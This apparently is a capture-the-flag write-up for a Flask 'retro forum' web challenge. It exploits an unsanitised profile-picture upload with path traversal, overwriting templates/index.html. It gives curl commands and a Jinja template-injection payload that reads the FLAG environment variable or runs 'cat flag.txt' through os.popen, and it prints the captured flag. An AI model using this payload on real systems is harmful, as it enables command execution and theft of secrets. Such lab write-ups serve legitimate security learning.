---
title: "AC CTF - retro forum"
date: "2025-11-09"
author: "stancium"
platform: "CTFd"
difficulty: "TBD"
category: "web"
tags: []
target: "http://c8ed21db.ctf.ac.upt.ro"
---

# TL;DR

The /edit_profile file upload trusts file.filename and writes it directly to disk
  under static/uploads.
Path traversal lets you overwrite templates (e.g., ../../templates/index.html).
Overwrite a template with a Jinja payload to read the FLAG from env or from flag.txt.
Visit / to execute your template and print the flag.
---

# Recon

- Homepage shows a simple forum with Profiles, Chats, Login/Register.
  - Headers reveal Flask dev server behind Caddy.
  - Local source (app.py) shows:
      - edit_profile saves profile_pic to os.path.join(app.config['UPLOAD_FOLDER'],
  filename) without sanitization.
      - Templates loaded normally via render_template(...).
      - Admin-only /debug/<filename> could read files but needs is_admin.
  - Dockerfile + encrypt.py:
      - ENV FLAG "redacted"
      - encrypt.py writes an encrypted copy to flag.txt.
      - App inherits the plain FLAG env var.
---

# Root cause

  1. Register and login to get a session (any user works).

  - Register (if already registered, this may 500 but user often gets created):
      - curl -c cookies -b cookies -L -X POST 'http://c8ed21db.ctf.ac.upt.ro/register' -d
  'username=hacker123&password=pass123&bio=hi'
  - Login:
      - curl -c cookies -b cookies -L -X POST 'http://c8ed21db.ctf.ac.upt.ro/login' -d
  'username=hacker123&password=pass123'

  2. Overwrite the home template with a Jinja payload that reads the flag.

  - Create payload file:
      - cat > payload.html << 'EOF'
      - <!doctype
  html><html><body><pre>{{ config.__class__.__init__.__globals__['os'].environ.get('FLAG')
  or config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}</pre></
  body></html>
      - EOF
  - Upload with path traversal to replace templates/index.html:
      - curl -b cookies -X POST 'http://c8ed21db.ctf.ac.upt.ro/edit_profile' -F
  'bio=owned' -F 'profile_pic=@payload.html;filename=../../templates/index.html'
---

# Get the flag
Trigger the overwritten template:
  - curl -b cookies -L 'http://c8ed21db.ctf.ac.upt.ro/'
  - Output shows the flag:
      - CTF{ede8cd39a9c2ed684aaccb288b7259e2d882af176964eb8af8ca86fac705677a}
---
